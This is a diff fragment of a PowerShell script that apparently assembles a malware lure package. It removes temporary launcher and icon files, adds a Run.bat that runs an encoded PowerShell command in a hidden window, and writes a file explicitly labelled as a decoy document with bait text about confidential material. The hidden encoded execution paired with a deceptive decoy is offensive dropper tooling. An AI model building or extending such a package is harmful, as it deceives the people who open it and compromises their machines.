@@ -92,6 +92,10 @@ Remove-Item "$tmpDir\launcher.rc" -Force -ErrorAction SilentlyContinue
 Remove-Item $icoPath -Force -ErrorAction SilentlyContinue
 Remove-Item $tmpDir -Force -ErrorAction SilentlyContinue
 
+# Run.bat (bypasses launcher issues)
+Set-Content "$Path\Run.bat" "@echo off`r`npowershell -w h -Enc $encCmd" -Encoding ASCII
+Write-Output "  [+] Run.bat created"
+
 # Decoy Document.txt
 Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
 Write-Output "  [+] Document.txt created"
